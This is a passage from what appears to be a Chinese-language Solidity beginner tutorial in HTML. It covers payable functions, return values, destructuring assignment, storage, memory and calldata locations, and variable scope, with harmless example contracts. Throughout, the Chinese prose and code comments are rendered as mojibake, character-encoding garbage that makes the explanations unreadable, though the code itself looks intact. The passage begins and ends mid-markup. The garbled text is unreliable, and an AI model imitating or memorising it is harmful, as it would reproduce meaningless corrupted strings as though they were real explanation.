alt="image-20250123033818196"></p><h5 id="payableçš„ä½¿ç”¨">payableçš„ä½¿ç”¨</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// payable: é€’é’±ï¼Œèƒ½ç»™åˆçº¦æ”¯ä»˜ethçš„å‡½æ•°</span><br><span class="line">function minusPayable() external payable returns(uint256 balance) &#123;</span><br><span class="line">    minus();    </span><br><span class="line">    balance = address(this).balance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å®šä¹‰ä¸€ä¸ª <code>external payable</code> çš„ <code>minusPayable()</code> å‡½æ•°ï¼Œé—´æ¥çš„è°ƒç”¨ <code>minus()</code>ï¼Œå¹¶ä¸”è¿”å›åˆçº¦é‡Œçš„ ETH ä½™é¢ï¼ˆ<code>this</code> å…³é”®å­—å¯ä»¥è®©æˆ‘ä»¬å¼•ç”¨åˆçº¦åœ°å€ï¼‰ã€‚æˆ‘ä»¬å¯ä»¥åœ¨è°ƒç”¨ <code>minusPayable()</code> æ—¶å¾€åˆçº¦é‡Œè½¬å…¥1ä¸ª ETHã€‚</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123034641393.png" alt="image-20250123034641393"></p><h3 id="å‡½æ•°è¾“å‡º">å‡½æ•°è¾“å‡º</h3><p>æµ‹è¯•ä»£ç <code>Return.sol</code>å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line">contract Return&#123;</span><br><span class="line">    // è¿”å›å¤šä¸ªå˜é‡</span><br><span class="line">    function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123;</span><br><span class="line">        return(1, true, [uint256(1),2,5]);</span><br><span class="line">    &#125;</span><br><span class="line">    // å‘½åå¼è¿”å›</span><br><span class="line">    function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">        _number = 2;</span><br><span class="line">        _bool = false;</span><br><span class="line">        _array = [uint256(3),2,1];</span><br><span class="line">    &#125;</span><br><span class="line">    // å‘½åå¼è¿”å›ï¼Œä¾ç„¶æ”¯æŒreturn</span><br><span class="line">    function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">        return(1, true, [uint256(1),2,5]);</span><br><span class="line">    &#125;</span><br><span class="line">    //è¯»å–è¿”å›å€¼ï¼Œè§£æ„å¼èµ‹å€¼</span><br><span class="line">    function readReturn() public pure&#123;</span><br><span class="line">        //è¯»å–å…¨éƒ¨è¿”å›å€¼</span><br><span class="line">        uint256 _number;</span><br><span class="line">        bool _bool;</span><br><span class="line">        bool _bool2;</span><br><span class="line">        uint256[3] memory _array;</span><br><span class="line">        (_number, _bool, _array) = returnNamed();</span><br><span class="line"></span><br><span class="line">        //è¯»å–éƒ¨åˆ†è¿”å›å€¼</span><br><span class="line">        (,_bool2,) = returnNamed();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è¿”å›å€¼ï¼šreturnå’Œreturns">è¿”å›å€¼ï¼šreturnå’Œreturns</h4><ul><li><code>returns</code>: è·Ÿåœ¨å‡½æ•°ååé¢ï¼Œç”¨äºå£°æ˜è¿”å›çš„å˜é‡ç±»å‹åŠå˜é‡åã€‚</li><li><code>return</code>: ç”¨äºå‡½æ•°ä¸»ä½“ä¸­ï¼Œè¿”å›æŒ‡å®šçš„å˜é‡ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// è¿”å›å¤šä¸ªå˜é‡</span><br><span class="line">function returnMultiple() public pure returns(uint256, bool, uint256[3] memory)&#123;</span><br><span class="line">    return(1, true, [uint256(1),2,5]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬åˆ©ç”¨ <code>returns</code> å…³é”®å­—å£°æ˜äº†æœ‰å¤šä¸ªè¿”å›å€¼çš„ <code>returnMultiple()</code> å‡½æ•°ï¼Œç„¶åæˆ‘ä»¬åœ¨å‡½æ•°ä¸»ä½“ä¸­ä½¿ç”¨ <code>return(1, true, [uint256(1),2,5])</code> ç¡®å®šäº†è¿”å›å€¼ã€‚</p><p>è¿™é‡Œ<code>uint256[3]</code>å£°æ˜äº†ä¸€ä¸ªé•¿åº¦ä¸º<code>3</code>ä¸”ç±»å‹ä¸º<code>uint256</code>çš„æ•°ç»„ä½œä¸ºè¿”å›å€¼ã€‚<strong>å› ä¸º<code>[1,2,3]</code>ä¼šé»˜è®¤ä¸º<code>uint8(3)</code>ï¼Œå› æ­¤<code>[uint256(1),2,5]</code>ä¸­é¦–ä¸ªå…ƒç´ å¿…é¡»å¼ºè½¬<code>uint256</code>æ¥å£°æ˜è¯¥æ•°ç»„å†…çš„å…ƒç´ çš†ä¸ºæ­¤ç±»å‹</strong>ã€‚</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250123234741062.png" alt="image-20250123234741062"></p><h4 id="å‘½åå¼è¿”å›">å‘½åå¼è¿”å›</h4><p>å¯ä»¥åœ¨ <code>returns</code> ä¸­æ ‡æ˜è¿”å›å˜é‡çš„åç§°ã€‚Solidity ä¼šåˆå§‹åŒ–è¿™äº›å˜é‡ï¼Œå¹¶ä¸”è‡ªåŠ¨è¿”å›è¿™äº›å‡½æ•°çš„å€¼ï¼Œæ— éœ€ä½¿ç”¨ <code>return</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// å‘½åå¼è¿”å›</span><br><span class="line">function returnNamed() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">    _number = 2;</span><br><span class="line">    _bool = false;</span><br><span class="line">    _array = [uint256(3),2,1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šè¿°ä»£ç ä¸­ï¼Œæˆ‘ä»¬ç”¨ <code>returns(uint256 _number, bool _bool, uint256[3] memory _array)</code> å£°æ˜äº†è¿”å›å˜é‡ç±»å‹ä»¥åŠå˜é‡åã€‚è¿™æ ·ï¼Œåœ¨ä¸»ä½“ä¸­åªéœ€ä¸ºå˜é‡ <code>_number</code>ã€<code>_bool</code>å’Œ<code>_array</code> èµ‹å€¼ï¼Œå³å¯<strong>è‡ªåŠ¨è¿”å›</strong>ã€‚</p><p>ä¹Ÿå¯ä»¥åœ¨å‘½åå¼è¿”å›ä¸­ç”¨ <code>return</code> æ¥è¿”å›å˜é‡ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// å‘½åå¼è¿”å›ï¼Œä¾ç„¶æ”¯æŒreturn</span><br><span class="line">function returnNamed2() public pure returns(uint256 _number, bool _bool, uint256[3] memory _array)&#123;</span><br><span class="line">    return(1, true, [uint256(1),2,5]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="è§£æ„å¼å¤åˆ¶">è§£æ„å¼å¤åˆ¶</h4><p>Solidity æ”¯æŒä½¿ç”¨è§£æ„å¼èµ‹å€¼è§„åˆ™æ¥è¯»å–å‡½æ•°çš„å…¨éƒ¨æˆ–éƒ¨åˆ†è¿”å›å€¼ã€‚</p><ul><li>è¯»å–æ‰€æœ‰è¿”å›å€¼ï¼šå£°æ˜å˜é‡ï¼Œç„¶åå°†è¦èµ‹å€¼çš„å˜é‡ç”¨<code>,</code>éš”å¼€ï¼ŒæŒ‰é¡ºåºæ’åˆ—ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint256 _number;</span><br><span class="line">bool _bool;</span><br><span class="line">uint256[3] memory _array;</span><br><span class="line">(_number, _bool, _array) = returnNamed();</span><br></pre></td></tr></table></figure><ul><li>è¯»å–éƒ¨åˆ†è¿”å›å€¼ï¼šå£°æ˜è¦è¯»å–çš„è¿”å›å€¼å¯¹åº”çš„å˜é‡ï¼Œä¸è¯»å–çš„ç•™ç©ºã€‚åœ¨ä¸‹é¢çš„ä»£ç ä¸­ï¼Œæˆ‘ä»¬åªè¯»å–<code>_bool</code>ï¼Œè€Œä¸è¯»å–è¿”å›çš„<code>_number</code>å’Œ<code>_array</code>ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(, _bool2, ) = returnNamed();</span><br></pre></td></tr></table></figure><h2 id="å˜é‡æ•°æ®å­˜å‚¨å’Œä½œç”¨åŸŸ">å˜é‡æ•°æ®å­˜å‚¨å’Œä½œç”¨åŸŸ</h2><p>æµ‹è¯•ä»£ç <code>DataStorage.sol</code>ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract DataStorage &#123;</span><br><span class="line">    // The data location of x is storage.</span><br><span class="line">    // This is the only place where the</span><br><span class="line">    // data location can be omitted.</span><br><span class="line">    uint[] public x = [1,2,3];</span><br><span class="line"></span><br><span class="line">    function fStorage() public&#123;</span><br><span class="line">        //å£°æ˜ä¸€ä¸ªstorageçš„å˜é‡xStorageï¼ŒæŒ‡å‘xã€‚ä¿®æ”¹xStorageä¹Ÿä¼šå½±å“x</span><br><span class="line">        uint[] storage xStorage = x;</span><br><span class="line">        xStorage[0] = 100;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fMemory() public view&#123;</span><br><span class="line">        //å£°æ˜ä¸€ä¸ªMemoryçš„å˜é‡xMemoryï¼Œå¤åˆ¶xã€‚ä¿®æ”¹xMemoryä¸ä¼šå½±å“x</span><br><span class="line">        uint[] memory xMemory = x;</span><br><span class="line">        xMemory[0] = 100;</span><br><span class="line">        xMemory[1] = 200;</span><br><span class="line">        uint[] memory xMemory2 = x;</span><br><span class="line">        xMemory2[0] = 300;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123;</span><br><span class="line">        //å‚æ•°ä¸ºcalldataæ•°ç»„ï¼Œä¸èƒ½è¢«ä¿®æ”¹</span><br><span class="line">        // _x[0] = 0 //è¿™æ ·ä¿®æ”¹ä¼šæŠ¥é”™</span><br><span class="line">        return(_x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æµ‹è¯•ä»£ç <code>Variables.sol</code>ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.21;</span><br><span class="line"></span><br><span class="line">contract Variables &#123;</span><br><span class="line">    uint public x = 1;</span><br><span class="line">    uint public y;</span><br><span class="line">    string public z;</span><br><span class="line"></span><br><span class="line">    function foo() external&#123;</span><br><span class="line">        // å¯ä»¥åœ¨å‡½æ•°é‡Œæ›´æ”¹çŠ¶æ€å˜é‡çš„å€¼</span><br><span class="line">        x = 5;</span><br><span class="line">        y = 2;</span><br><span class="line">        z = &quot;0xAA&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function bar() external pure returns(uint)&#123;</span><br><span class="line">        uint xx = 1;</span><br><span class="line">        uint yy = 3;</span><br><span class="line">        uint zz = xx + yy;</span><br><span class="line">        return(zz);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function global() external view returns(address, uint, bytes memory)&#123;</span><br><span class="line">        address sender = msg.sender;</span><br><span class="line">        uint blockNum = block.number;</span><br><span class="line">        bytes memory data = msg.data;</span><br><span class="line">        return(sender, blockNum, data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function weiUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 wei == 1e0);</span><br><span class="line">        assert(1 wei == 1);</span><br><span class="line">        return 1 wei;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function gweiUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 gwei == 1e9);</span><br><span class="line">        assert(1 gwei == 1000000000);</span><br><span class="line">        return 1 gwei;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function etherUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 ether == 1e18);</span><br><span class="line">        assert(1 ether == 1000000000000000000);</span><br><span class="line">        return 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function secondsUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 seconds == 1);</span><br><span class="line">        return 1 seconds;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function minutesUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 minutes == 60);</span><br><span class="line">        assert(1 minutes == 60 seconds);</span><br><span class="line">        return 1 minutes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function hoursUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 hours == 3600);</span><br><span class="line">        assert(1 hours == 60 minutes);</span><br><span class="line">        return 1 hours;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function daysUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 days == 86400);</span><br><span class="line">        assert(1 days == 24 hours);</span><br><span class="line">        return 1 days;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function weeksUnit() external pure returns(uint) &#123;</span><br><span class="line">        assert(1 weeks == 604800);</span><br><span class="line">        assert(1 weeks == 7 days);</span><br><span class="line">        return 1 weeks;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Solidityä¸­çš„å¼•ç”¨ç±»å‹">Solidityä¸­çš„å¼•ç”¨ç±»å‹</h3><p><strong>å¼•ç”¨ç±»å‹(Reference Type)</strong>ï¼šåŒ…æ‹¬æ•°ç»„ï¼ˆ<code>array</code>ï¼‰å’Œç»“æ„ä½“ï¼ˆ<code>struct</code>ï¼‰ï¼Œç”±äºè¿™ç±»å˜é‡æ¯”è¾ƒå¤æ‚ï¼Œå ç”¨å­˜å‚¨ç©ºé—´å¤§ï¼Œæˆ‘ä»¬åœ¨ä½¿ç”¨æ—¶å¿…é¡»è¦å£°æ˜æ•°æ®å­˜å‚¨çš„ä½ç½®ã€‚</p><h3 id="æ•°æ®ä½ç½®">æ•°æ®ä½ç½®</h3><p>Solidityæ•°æ®å­˜å‚¨ä½ç½®æœ‰ä¸‰ç±»ï¼š<code>storage</code>ï¼Œ<code>memory</code>å’Œ<code>calldata</code>ã€‚ä¸åŒå­˜å‚¨ä½ç½®çš„<code>gas</code>æˆæœ¬ä¸åŒã€‚</p><ul><li><p><code>storage</code>ç±»å‹çš„æ•°æ®å­˜åœ¨é“¾ä¸Šï¼Œç±»ä¼¼è®¡ç®—æœºçš„ç¡¬ç›˜ï¼Œæ¶ˆè€—<code>gas</code>å¤šï¼›</p></li><li><p><code>memory</code>å’Œ<code>calldata</code>ç±»å‹çš„ä¸´æ—¶å­˜åœ¨å†…å­˜é‡Œï¼Œæ¶ˆè€—<code>gas</code>å°‘ã€‚</p></li></ul><p>å¤§è‡´ç”¨æ³•ï¼š</p><ol><li><code>storage</code>ï¼šåˆçº¦é‡Œçš„çŠ¶æ€å˜é‡é»˜è®¤éƒ½æ˜¯<code>storage</code>ï¼Œå­˜å‚¨åœ¨é“¾ä¸Šã€‚</li><li><code>memory</code>ï¼šå‡½æ•°é‡Œçš„å‚æ•°å’Œä¸´æ—¶å˜é‡ä¸€èˆ¬ç”¨<code>memory</code>ï¼Œå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä¸ä¸Šé“¾ã€‚å°¤å…¶æ˜¯å¦‚æœè¿”å›æ•°æ®ç±»å‹æ˜¯å˜é•¿çš„æƒ…å†µä¸‹ï¼Œå¿…é¡»åŠ memoryä¿®é¥°ï¼Œä¾‹å¦‚ï¼šstring, bytes, arrayå’Œè‡ªå®šä¹‰ç»“æ„ã€‚</li><li><code>calldata</code>ï¼šå’Œ<code>memory</code>ç±»ä¼¼ï¼Œå­˜å‚¨åœ¨å†…å­˜ä¸­ï¼Œä¸ä¸Šé“¾ã€‚ä¸<code>memory</code>çš„ä¸åŒç‚¹åœ¨äº<code>calldata</code>å˜é‡ä¸èƒ½ä¿®æ”¹ï¼ˆ<code>immutable</code>ï¼‰ï¼Œä¸€èˆ¬ç”¨äºå‡½æ•°çš„å‚æ•°ã€‚</li></ol><p><code>calldata</code>ä¿®é¥°çš„å˜é‡ä¸èƒ½è¢«ä¿®æ”¹ï¼Œä¾‹å­å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function fCalldata(uint[] calldata _x) public pure returns(uint[] calldata)&#123;</span><br><span class="line">    //å‚æ•°ä¸ºcalldataæ•°ç»„ï¼Œä¸èƒ½è¢«ä¿®æ”¹</span><br><span class="line">    _x[0] = 0; //è¿™æ ·ä¿®æ”¹ä¼šæŠ¥é”™</span><br><span class="line">    return(_x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124163637660.png" alt="image-20250124163637660"></p><h4 id="æ•°æ®ä½ç½®å’Œèµ‹å€¼è§„åˆ™">æ•°æ®ä½ç½®å’Œèµ‹å€¼è§„åˆ™</h4><p>åœ¨ä¸åŒå­˜å‚¨ç±»å‹ç›¸äº’èµ‹å€¼æ—¶å€™ï¼Œ<strong>æœ‰æ—¶ä¼šäº§ç”Ÿç‹¬ç«‹çš„å‰¯æœ¬ï¼ˆä¿®æ”¹æ–°å˜é‡ä¸ä¼šå½±å“åŸå˜é‡ï¼‰ï¼Œæœ‰æ—¶ä¼šäº§ç”Ÿå¼•ç”¨ï¼ˆä¿®æ”¹æ–°å˜é‡ä¼šå½±å“åŸå˜é‡ï¼‰</strong>ã€‚è§„åˆ™å¦‚ä¸‹ï¼š</p><ol><li>èµ‹å€¼æœ¬è´¨ä¸Šæ˜¯åˆ›å»º<strong>å¼•ç”¨</strong>æŒ‡å‘æœ¬ä½“ï¼Œå› æ­¤ä¿®æ”¹æœ¬ä½“æˆ–è€…æ˜¯å¼•ç”¨ï¼Œå˜åŒ–å¯ä»¥è¢«åŒæ­¥ã€‚</li></ol><ul><li><code>storage</code>ï¼ˆåˆçº¦çš„çŠ¶æ€å˜é‡ï¼‰èµ‹å€¼ç»™æœ¬åœ°<code>storage</code>ï¼ˆå‡½æ•°é‡Œçš„ï¼‰æ—¶å€™ï¼Œä¼šåˆ›å»ºå¼•ç”¨ï¼Œæ”¹å˜æ–°å˜é‡ä¼šå½±å“åŸå˜é‡ã€‚æ ·ä¾‹å¦‚ä¸‹ï¼š</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uint[] x = [1,2,3]; // çŠ¶æ€å˜é‡ï¼šæ•°ç»„ x</span><br><span class="line"></span><br><span class="line">function fStorage() public&#123;</span><br><span class="line">    //å£°æ˜ä¸€ä¸ªstorageçš„å˜é‡ xStorageï¼ŒæŒ‡å‘xã€‚ä¿®æ”¹xStorageä¹Ÿä¼šå½±å“x</span><br><span class="line">    uint[] storage xStorage = x;</span><br><span class="line">    xStorage[0] = 100;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>éƒ¨ç½²è°ƒç”¨ä¸€ä¸‹<code>fStorage</code>å‡½æ•°ï¼Œç„¶ååˆ©ç”¨äº¤æ˜“çš„<code>hash</code>å¯¹ä»£ç è¿›è¡Œè°ƒè¯•ï¼Œå‘ç°æ•°å€¼è¢«æ›´æ”¹ã€‚</p><p><img src="/2025/01/22/Solidity%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0-%E4%B8%80/image-20250124165024783.png" alt="image-20250124165024783"></p><ul><li><code>memory</code>èµ‹å€¼ç»™<code>memory</code>ï¼Œä¼šåˆ›å»ºå¼•ç”¨ï¼Œæ”¹å˜æ–°å˜é‡ä¼šå½±å“åŸå˜é‡ã€‚</li></ul><ol start="2"><li>å…¶ä»–æƒ…å†µä¸‹ï¼Œèµ‹å€¼åˆ›å»ºçš„æ˜¯æœ¬ä½“çš„å‰¯æœ¬ï¼Œå³å¯¹äºŒè€…ä¹‹ä¸€çš„ä¿®æ”¹ï¼Œå¹¶ä¸ä¼šåŒæ­¥åˆ°å¦ä¸€æ–¹ã€‚</li></ol><h3 id="å˜é‡çš„ä½œç”¨åŸŸ">å˜é‡çš„ä½œç”¨åŸŸ</h3><p><code>Solidity</code>ä¸­å˜é‡æŒ‰ä½œç”¨åŸŸåˆ’åˆ†æœ‰ä¸‰ç§ï¼Œåˆ†åˆ«æ˜¯<strong>çŠ¶æ€å˜é‡ï¼ˆstate variableï¼‰</strong>ï¼Œ<strong>å±€éƒ¨å˜é‡ï¼ˆlocal variableï¼‰<strong>å’Œ</strong>å…¨å±€å˜é‡(global variable)</strong></p><h4 id="çŠ¶æ€å˜é‡ï¼ˆstate-variableï¼‰">çŠ¶æ€å˜é‡ï¼ˆstate variableï¼‰</h4><p>çŠ¶æ€å˜é‡æ˜¯æ•°æ®å­˜å‚¨åœ¨é“¾ä¸Šçš„å˜é‡ï¼Œæ‰€æœ‰åˆçº¦å†…å‡½æ•°éƒ½å¯ä»¥è®¿é—®ï¼Œ<code>gas</code>æ¶ˆè€—é«˜ã€‚çŠ¶æ€å˜é‡åœ¨åˆçº¦å†…ã€å‡½æ•°å¤–å£°æ˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">contract Variables &#123;</span><br><span class="line">    uint public x = 1;</span><br><span class="line">    uint public y;</span><br><span class="line">    string public z;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥åœ¨å‡½æ•°é‡Œæ›´æ”¹çŠ¶æ€å˜é‡çš„å€¼ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function foo() external&#123;</span><br><span class="line">    // å¯ä»¥åœ¨å‡½æ•°é‡Œæ›´æ”¹çŠ¶æ€å˜é‡çš„å€¼</span><br><span class="line">    x = 5;</span><br><span class="line">    y = 2;</span><br><span class="line">    z = &quot;0xAA&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å±€éƒ¨å˜é‡ï¼ˆlocal-variableï¼‰">å±€éƒ¨å˜é‡ï¼ˆlocal variableï¼‰</h4><p>å±€éƒ¨å˜é‡æ˜¯ä»…åœ¨å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸­æœ‰æ•ˆçš„å˜é‡ï¼Œ<strong>å‡½æ•°é€€å‡ºåï¼Œå˜é‡æ— æ•ˆ</strong>ã€‚å±€éƒ¨å˜é‡çš„<strong>æ•°æ®å­˜å‚¨åœ¨å†…å­˜é‡Œï¼Œä¸ä¸Šé“¾ï¼Œ<code>gas</code>ä½ã€‚</strong></p><p>å±€éƒ¨å˜é‡åœ¨å‡½æ•°å†…å£°æ˜ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function bar() external pure returns(uint)&#123;</span><br><span class="line">    uint xx = 1;</span><br><span class="line">    uint yy = 3;</span><br><span class="line">    uint zz = xx + yy;</span><br><span class="line">    return(zz);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="å…¨å±€å˜é‡ï¼ˆglobal-variableï¼‰">å…¨å±€å˜é‡ï¼ˆglobal variableï¼‰</h4><p>å…¨å±€å˜é‡æ˜¯å…¨å±€èŒƒå›´å·¥ä½œçš„å˜é‡ï¼Œéƒ½æ˜¯<code>solidity</code>é¢„ç•™å…³é”®å­—ã€‚ä»–ä»¬å¯ä»¥åœ¨å‡½æ•°å†…ä¸å£°æ˜ç›´æ¥ä½¿ç”¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function global() external view returns(address, uint, bytes memory)&#123;</span><br><span class="line">    address sender = msg.sender;</span><br><span class="line">    uint blockNum = block.number;</span><br><span class="line">    bytes memory data = msg.data;</span><br><span class="line">    return(sender, blockNum, data);</span><br><span 